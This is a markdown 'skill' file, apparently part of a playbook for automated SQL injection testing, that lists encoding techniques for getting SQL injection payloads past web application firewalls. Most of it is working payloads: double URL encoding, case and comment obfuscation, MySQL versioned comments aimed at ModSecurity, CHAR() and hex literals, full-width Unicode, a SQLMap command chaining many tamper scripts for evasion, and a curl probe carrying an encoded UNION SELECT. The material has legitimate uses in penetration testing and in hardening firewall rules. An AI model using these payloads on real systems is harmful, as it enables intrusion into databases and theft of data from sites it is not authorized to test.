# Skill: Encoding Strategies for WAF Bypass

## Metadata
- Phase: waf_evasion
- Techniques: all
- DB Targets: all
- Risk Level: medium
- Prerequisites: tamper scripts insufficient, advanced evasion needed

## When to Use

Use when tamper scripts alone are insufficient. Encoding strategies exploit how WAFs decode and inspect payloads vs. how databases interpret them. The goal is to create payloads that bypass WAF inspection but execute correctly in the database.

## Core Concept: Double Decoding Attack

Some WAFs only decode once, but servers may decode twice:
```
Original: UNION SELECT
URL-encoded once: UNION%20SELECT  (WAF sees keywords, blocks)
URL-encoded twice: UNION%2520SELECT (WAF sees %2520, passes; server decodes to UNION SELECT)
```

## URL Encoding Techniques

### Single URL Encoding
```
SPACE -> %20
'     -> %27
"     -> %22
=     -> %3D
<     -> %3C
>     -> %3E
```

SQLMap: `--tamper=charencode`

### Double URL Encoding
```
SPACE -> %2520
'     -> %2527
```

SQLMap: `--tamper=chardoubleencode`

### Selective Encoding (Keywords Only)
```
UNION SELECT -> %55NION %53ELECT
SELECT -> %53ELECT
```

## Case Variation Strategies

### Simple Randomization
```sql
UNION SELECT -> UnIoN SeLeCt
```
SQLMap: `--tamper=randomcase`

### Mixed Case + Comment
```sql
UNION SELECT -> UNiOn/**/SeLEcT
```
SQLMap: `--tamper=randomcase,space2comment`

### MySQL Versioned Comments
```sql
SELECT -> /*!50000SELECT*/
UNION -> /*!UNION*/
```
SQLMap: `--tamper=versionedkeywords`

### Zero-Version Comments (ModSecurity bypass)
```sql
SELECT -> /*!00000SELECT*/
```
SQLMap: `--tamper=modsecurityzeroversioned`

## Whitespace Strategies

### SQL Comment as Space
```sql
SELECT * FROM users -> SELECT/**/*/**/FROM/**/users
```

### Hex-encoded Space
```sql
SELECT%09FROM  (tab character)
SELECT%0aFROM  (newline)
SELECT%0dFROM  (carriage return)
SELECT%0cFROM  (form feed)
```

### MSSQL-specific Whitespace
```sql
SELECT[table_name]FROM[information_schema].[tables]
```

## Character-Level Obfuscation

### MySQL CHAR() Function
```sql
-- Instead of 'admin'
CHAR(97,100,109,105,110)

-- Instead of database name literal
CONCAT(CHAR(117),CHAR(115),CHAR(101),CHAR(114),CHAR(115))
```

### HEX Encoding
```sql
-- Instead of 'admin'
0x61646d696e

-- In query:
WHERE username=0x61646d696e
```

### CONCAT with encoded values
```sql
WHERE username=CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))
```

## Operator Substitution

| Original | Alternative | Notes |
|----------|-------------|-------|
| `=` | `LIKE` | Equal check |
| `=` | `IN(val)` | Single value |
| `>` | `NOT BETWEEN 0 AND X` | Greater than |
| `<` | `GREATEST(a,b)` reversed | |
| `AND` | `&&` | MySQL |
| `OR` | `\|\|` | MySQL |
| `NOT` | `!` | |

SQLMap: `--tamper=between,equaltolike`

## Unicode and Multi-Byte Attacks

Some WAFs fail on Unicode:
```
' (U+0027) -> ＇ (U+FF07, full-width apostrophe)
SELECT -> ＳＥＬＥＣＴ (full-width letters)
```

SQLMap: `--tamper=apostrophemask`

## Combining Strategies: Maximum Evasion

```bash
sqlmap -u "TARGET" \
  --tamper=apostrophemask,base64encode,between,charencode,chardoubleencode,equaltolike,greatest,halfversionedmorekeywords,modsecurityzeroversioned,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehashes,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,unmagicquotes,uppercase,versionedkeywords,versionedmorekeywords,xforwardedfor \
  --random-agent \
  --delay=3 \
  --batch
```

Note: This is overkill — use incremental approach first.

## Testing Custom Payloads

Test specific payloads manually before running full SQLMap:

```bash
# Test if encoded payload bypasses WAF
curl -v "http://target.com/page.php?id=1%20%55%4E%49%4F%4E%20%53%45%4C%45%43%54%20%31%2C%32%2C%33--"

# Test with Burp Intruder for systematic fuzzing
# Payload set: use character substitution list
```

## Red Flags (wrong skill)
- All encoding bypassed but still detected -> WAF uses semantic analysis (understanding intent, not just patterns)
- Only works with specific encoding on one endpoint -> encoding inconsistency in target, note per-endpoint settings

## Follow-Up
- Bypass achieved -> [Quick Scan](../01_detection/quick_scan.md) with encoding applied
- Semantic WAF (behavior-based) -> requires manual payload crafting, specialized testing
- Need to verify bypass -> check [WAF Tamper Matrix](../../tamper/WAF_TAMPER_MATRIX.md)
